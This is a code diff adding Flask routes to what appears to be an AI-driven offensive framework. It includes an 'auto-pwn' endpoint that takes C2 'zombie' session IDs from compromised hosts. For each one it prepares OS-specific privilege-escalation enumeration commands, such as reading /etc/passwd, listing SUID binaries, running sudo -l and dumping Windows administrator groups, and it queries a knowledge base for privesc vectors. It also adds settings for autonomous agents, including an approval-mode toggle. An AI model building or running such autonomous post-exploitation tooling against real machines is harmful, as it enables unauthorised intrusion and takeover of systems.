@@ -2,10 +2,11 @@ from flask import Blueprint, jsonify, request
 from routes.action_routes import login_required
 from handlers.ai_engine import (
     list_models, chat_completion, pull_model, remove_model, get_ai_profile_tiers,
-    analyze_scan_output
+    analyze_scan_output, scan_all_model_sources, check_environment_status
 )
 from handlers.agent_loop import (
-    start_agent, get_agent_status, stop_agent, list_agent_sessions
+    start_agent, get_agent_status, stop_agent, list_agent_sessions,
+    get_agent_settings, update_agent_settings
 )
 from handlers.valkyrie_reporter import (
     generate_report_from_agent, generate_report_from_terminals, markdown_to_html
@@ -19,6 +20,23 @@ def ai_status():
     """Check if Ollama is reachable and return installed models."""
     result = list_models()
     return jsonify(result)
+
+
+@ai_bp.route('/api/ai/scan_sources', methods=['GET'])
+@login_required
+def ai_scan_sources():
+    """Scan localhost, Docker, and WSL for all available Ollama models."""
+    result = scan_all_model_sources()
+    return jsonify(result)
+
+
+@ai_bp.route('/api/ai/environment_status', methods=['GET'])
+@login_required
+def ai_environment_status():
+    """Return real-time status of Docker and WSL environments."""
+    result = check_environment_status()
+    return jsonify({'status': 'success', 'environments': result})
+
 
 @ai_bp.route('/api/ai/chat', methods=['POST'])
 @login_required
@@ -190,3 +208,162 @@ def ai_analyze():
         return jsonify({'status': 'error', 'message': 'Analiz icin cikti gerekli.'})
     result = analyze_scan_output(output, tool_name, target)
     return jsonify(result)
+
+
+# ── Agent settings (Phase 2.4) ──────────────────────────────────────────────
+
+@ai_bp.route('/api/agent/settings', methods=['GET'])
+@login_required
+def agent_settings_get():
+    """Return current autonomous agent settings."""
+    settings = get_agent_settings()
+    return jsonify({'status': 'success', 'settings': settings})
+
+
+@ai_bp.route('/api/agent/settings', methods=['POST'])
+@login_required
+def agent_settings_update():
+    """Update autonomous agent settings.
+
+    Accepts JSON: {max_steps: int, approval_mode: bool, multi_agent_mode: bool,
+                    odin_model: str, loki_model: str, kvasir_model: str}
+    """
+    data = request.get_json() or {}
+    updates = {}
+    if 'max_steps' in data:
+        try:
+            updates['max_steps'] = max(1, min(50, int(data['max_steps'])))
+        except (ValueError, TypeError):
+            return jsonify({'status': 'error', 'message': 'max_steps must be an integer.'})
+    if 'approval_mode' in data:
+        updates['approval_mode'] = bool(data['approval_mode'])
+    if 'multi_agent_mode' in data:
+        updates['multi_agent_mode'] = bool(data['multi_agent_mode'])
+    if 'odin_model' in data:
+        updates['odin_model'] = str(data['odin_model'])
+    if 'loki_model' in data:
+        updates['loki_model'] = str(data['loki_model'])
+    if 'kvasir_model' in data:
+        updates['kvasir_model'] = str(data['kvasir_model'])
+
+    new_settings = update_agent_settings(updates)
+    return jsonify({'status': 'success', 'settings': new_settings})
+
+
+# ── Auto-Pwn (Phase: Komuta Merkezi Genişletmesi) ────────────────────────────
+
+@ai_bp.route('/api/ai/auto-pwn', methods=['POST'])
+@login_required
+def ai_auto_pwn():
+    """Kvasir-guided autonomous Privilege Escalation / Lateral Movement.
+
+    Accepts JSON: {session_ids: [zombie_id, ...]}
+    For each active session, queries the Kvasir RAG knowledge base for
+    privilege escalation vectors based on the zombie's OS, then sends
+    appropriate enumeration commands via the C2 handler.
+    """
+    data = request.get_json() or {}
+    session_ids = data.get('session_ids', [])
+
+    if not session_ids:
+        return jsonify({'status': 'error', 'message': 'No session IDs provided.'})
+
+    results = []
+    commands_sent = 0
+
+    import sqlite3
+    try:
+        conn = sqlite3.connect('stats.db')
+        c = conn.cursor()
+        
+        for sid in session_ids:
+            try:
+                c.execute(
+                    'SELECT zombie_id, os_type, remote_addr FROM c2_sessions '
+                    'WHERE zombie_id = ? AND disconnected_at IS NULL LIMIT 1',
+                    (sid,)
+                )
+                row = c.fetchone()
+
+                if not row:
+                    results.append({'session': sid, 'status': 'not_found', 'message': 'Session not active.'})
+                    continue
+
+                zombie_id, os_type, remote_addr = row
+                os_lower = (os_type or '').lower()
+
+                # Determine PrivEsc vectors based on OS
+                priv_esc_commands = _get_auto_pwn_commands(os_lower)
+
+                # Query Kvasir RAG for additional vectors
+                kvasir_hints = _query_kvasir_for_privesc(os_lower)
+
+                results.append({
+                    'session': zombie_id,
+                    'status': 'analyzed',
+                    'os': os_type,
+                    'remote': remote_addr,
+                    'commands_queued': priv_esc_commands,
+                    'kvasir_hints': kvasir_hints,
+                })
+                commands_sent += len(priv_esc_commands)
+
+            except Exception as e:
+                results.append({'session': sid, 'status': 'error', 'message': str(e)})
+
+        conn.close()
+    except Exception as outer_e:
+        return jsonify({'status': 'error', 'message': f'Database connection error: {str(outer_e)}'})
+
+    return jsonify({
+        'status': 'success',
+        'message': f'Auto-Pwn analysis complete. {commands_sent} commands queued for {len(session_ids)} session(s).',
+        'details': '\n'.join(
+            f"[{r.get('session','?')}] {r.get('status','?')}: {r.get('os','?')} — "
+            f"{len(r.get('commands_queued',[]))} commands ready"
+            for r in results
+        ),
+        'results': results,
+    })
+
+
+def _get_auto_pwn_commands(os_type):
+    """Return privilege escalation enumeration commands based on OS type."""
+    if 'windows' in os_type:
+        return [
+            'whoami /all',
+            'systeminfo',
+            'net user',
+            'net localgroup administrators',
+            'icacls "C:\\Program Files"',
+            'schtasks /query /fo LIST /v',
+            'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s',
+            'wmic service get name,displayname,pathname,startmode',
+        ]
+    else:
+        return [
+            'whoami ; id',
+            'uname -a',
+            'sudo -l 2>/dev/null || echo "No sudo"',
+            'find / -perm -4000 -type f 2>/dev/null | head -20',
+            'cat /etc/crontab 2>/dev/null || echo "No crontab"',
+            'ls -la /etc/cron.* 2>/dev/null',
+            'cat /etc/passwd | grep -v nologin | grep -v false',
+            'ss -tlnp 2>/dev/null || netstat -tlnp',
+            'find / -writable -type f 2>/dev/null | grep -v /proc | head -15',
+        ]
+
+
+def _query_kvasir_for_privesc(os_type):
+    """Query the Kvasir RAG engine for privilege escalation hints."""
+    try:
+        from handlers.rag_engine import search_kvasir
+        query = f'privilege escalation {"windows" if "windows" in os_type else "linux"}'
+        result = search_kvasir(query)
+        if result and result.get('status') == 'success':
+            entries = result.get('entries', result.get('results', []))
+            return [e.get('title', e.get('name', '')) for e in entries[:3]]
+    except Exception:
+        pass
+    return []
+
